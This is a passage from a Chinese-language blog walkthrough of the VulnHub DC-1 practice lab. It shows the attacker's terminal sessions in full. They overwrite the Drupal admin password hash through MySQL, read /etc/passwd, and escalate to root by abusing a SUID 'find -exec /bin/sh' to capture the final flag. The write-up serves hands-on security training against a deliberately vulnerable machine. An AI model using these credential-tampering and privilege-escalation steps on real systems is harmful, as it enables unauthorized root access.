+</span></span><span class=line><span class=cl>mysql -u dbuser -pR0ck3t
+</span></span><span class=line><span class=cl>Welcome to the MySQL monitor.  Commands end with <span class=p>;</span> or <span class=se>\g</span>.
+</span></span><span class=line><span class=cl>Your MySQL connection id is <span class=m>2437</span>
+</span></span><span class=line><span class=cl>Server version: 5.5.60-0+deb7u1 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+</span></span><span class=line><span class=cl>Oracle is a registered trademark of Oracle Corporation and/or its
+</span></span><span class=line><span class=cl>affiliates. Other names may be trademarks of their respective
+</span></span><span class=line><span class=cl>owners.
+</span></span><span class=line><span class=cl>Type <span class=s1>&#39;help;&#39;</span> or <span class=s1>&#39;\h&#39;</span> <span class=k>for</span> help. Type <span class=s1>&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class=line><span class=cl>mysql&gt; use drupaldb<span class=p>;</span>
+</span></span><span class=line><span class=cl>use drupaldb<span class=p>;</span>
+</span></span><span class=line><span class=cl>Reading table information <span class=k>for</span> completion of table and column names
+</span></span><span class=line><span class=cl>You can turn off this feature to get a quicker startup with -A
+</span></span><span class=line><span class=cl>Database changed
+</span></span><span class=line><span class=cl>mysql&gt; UPDATE users SET <span class=nv>pass</span> <span class=o>=</span> <span class=s1>&#39;$S$DsDCtVFLMdMUZ3yHMnlkatK2yJ8NJu99z93EFSUtLx709Y9MkhgD&#39;</span> WHERE <span class=nv>name</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>&lt;lkatK2yJ8NJu99z93EFSUtLx709Y9MkhgD<span class=s1>&#39; WHERE name = &#39;</span>admin<span class=err>&#39;</span><span class=p>;</span>                  
+</span></span><span class=line><span class=cl>Query OK, <span class=m>1</span> row affected <span class=o>(</span>0.00 sec<span class=o>)</span>
+</span></span><span class=line><span class=cl>Rows matched: <span class=m>1</span>  Changed: <span class=m>1</span>  Warnings: <span class=m>0</span>
+</span></span><span class=line><span class=cl>mysql&gt; <span class=nb>exit</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=访问http101010131user-之前nmap暴露出来的路径获取flag3>访问http://10.10.10.131/user 之前nmap暴露出来的路径获取flag3</h2><p><img class=gallery-image data-flex-basis=451px data-flex-grow=188 height=1020 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2.png srcset="/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2_hu_4c8c063d5345c87e.png 800w, /p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2_hu_fabc4a41a219547c.png 1600w, /p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index2.png 1920w" width=1920></p><p>登陆之后点击dashboard 看到flag3点击获得</p><p>Special PERMS will help FIND the passwd - but you&rsquo;ll need to -exec that command to work out how to get what&rsquo;s in the shadow</p><p>特殊的PERMS权限将有助于找到密码，但你需要执行<code>-exec</code>命令来弄清楚如何获取shadow文件中的内容。</p><h2 id=根据提示我们需要找到密码并读取并找到了flag4>根据提示我们需要找到密码并读取并找到了flag4</h2><p>直接cat /ect/passwd</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>cat /etc/passwd
+</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/bin/sh
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/bin/sh
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/bin/sh
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/bin/sh
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/bin/sh
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/bin/sh
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/bin/sh
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/bin/sh
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/bin/sh
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span></span><span class=line><span class=cl>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span></span><span class=line><span class=cl>Debian-exim:x:101:104::/var/spool/exim4:/bin/false
+</span></span><span class=line><span class=cl>statd:x:102:65534::/var/lib/nfs:/bin/false
+</span></span><span class=line><span class=cl>messagebus:x:103:107::/var/run/dbus:/bin/false
+</span></span><span class=line><span class=cl>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><p>找到了flag4的位置</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@DC-1:/etc$ <span class=nb>cd</span> /home
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /home
+</span></span><span class=line><span class=cl>www-data@DC-1:/home$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>flag4
+</span></span><span class=line><span class=cl>www-data@DC-1:/home$ cat flag4 
+</span></span><span class=line><span class=cl>cat flag4
+</span></span><span class=line><span class=cl>cat: flag4: Is a directory
+</span></span><span class=line><span class=cl>www-data@DC-1:/home$ <span class=nb>cd</span> flag4
+</span></span><span class=line><span class=cl><span class=nb>cd</span> flag4
+</span></span><span class=line><span class=cl>www-data@DC-1:/home/flag4$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>flag4.txt
+</span></span><span class=line><span class=cl>www-data@DC-1:/home/flag4$ cat flag4.txt
+</span></span><span class=line><span class=cl>cat flag4.txt
+</span></span><span class=line><span class=cl>Can you use this same method to find or access the flag in root?
+</span></span><span class=line><span class=cl>Probably. But perhaps it<span class=err>&#39;</span>s not that easy.  Or maybe it is?
+</span></span><span class=line><span class=cl>www-data@DC-1:/home/flag4$ 
+</span></span></code></pre></td></tr></table></div></div><h2 id=很明显提示我们-suid-提权>很明显提示我们 suid 提权</h2><p>先find有权限的文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@DC-1:/home/flag4$ find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/bin/mount
+</span></span><span class=line><span class=cl>/bin/ping
+</span></span><span class=line><span class=cl>/bin/su
+</span></span><span class=line><span class=cl>/bin/ping6
+</span></span><span class=line><span class=cl>/bin/umount
+</span></span><span class=line><span class=cl>/usr/bin/at
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/passwd
+</span></span><span class=line><span class=cl>/usr/bin/newgrp
+</span></span><span class=line><span class=cl>/usr/bin/chfn
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/procmail
+</span></span><span class=line><span class=cl>/usr/bin/find
+</span></span><span class=line><span class=cl>/usr/sbin/exim4
+</span></span><span class=line><span class=cl>/usr/lib/pt_chown
+</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/sbin/mount.nfs
+</span></span><span class=line><span class=cl>www-data@DC-1:/home/flag4$
+</span></span></code></pre></td></tr></table></div></div><p>找到了这个find文件夹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@DC-1:/home/flag4$ find . -exec /bin/sh <span class=se>\;</span>
+</span></span><span class=line><span class=cl>find . -exec /bin/sh <span class=se>\;</span>
+</span></span><span class=line><span class=cl><span class=c1># whoami</span>
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>root
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取flag5渗透结束>获取flag5渗透结束</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># cd root</span>
+</span></span><span class=line><span class=cl><span class=nb>cd</span> root
+</span></span><span class=line><span class=cl>/bin/sh: 1: cd: can<span class=s1>&#39;t cd to root
+</span></span></span><span class=line><span class=cl><span class=s1># whoami
+</span></span></span><span class=line><span class=cl><span class=s1>whoami
+</span></span></span><span class=line><span class=cl><span class=s1>root
+</span></span></span><span class=line><span class=cl><span class=s1># cd /root
+</span></span></span><span class=line><span class=cl><span class=s1>cd /root
+</span></span></span><span class=line><span class=cl><span class=s1># ls
+</span></span></span><span class=line><span class=cl><span class=s1>ls
+</span></span></span><span class=line><span class=cl><span class=s1>thefinalflag.txt
+</span></span></span><span class=line><span class=cl><span class=s1># cat thefinalflag.txt
+</span></span></span><span class=line><span class=cl><span class=s1>cat thefinalflag.txt
+</span></span></span><span class=line><span class=cl><span class=s1>Well done!!!!
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Hopefully you&#39;</span>ve enjoyed this and learned some new skills.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You can <span class=nb>let</span> me know what you thought of this little journey
+</span></span><span class=line><span class=cl>by contacting me via Twitter - @DCAU7
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=总结>总结</h2><p>nmap进行信息收集，发现只能22和80端口入手&ndash;>80端口是个Drupal cms通过指纹插件和msf 获取shell 获取flag1&ndash;>根据flag1提示读取settings.php获得mysql 登陆凭证和flag2&ndash;>flag2提示获得凭证会干什么于是登陆mysql替换加盐密码根据nmap扫描获取的路径进行登陆在仪表盘获取flag3&ndash;>flag3提示需要用到find和密码于是读取/etc/passwd 获取flag4.txt &ndash;>提示要以同样的方式获得flag5</p><p>利用的工具</p><div class=table-wrapper><table><thead><tr><th>工具</th><th>作用</th></tr></thead><tbody><tr><td>nmap</td><td>进行信息收集</td></tr><tr><td>Metasploit</td><td>获取shell</td></tr><tr><td>sqlmap</td><td>验证是否sql注入存在</td></tr></tbody></table></div></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
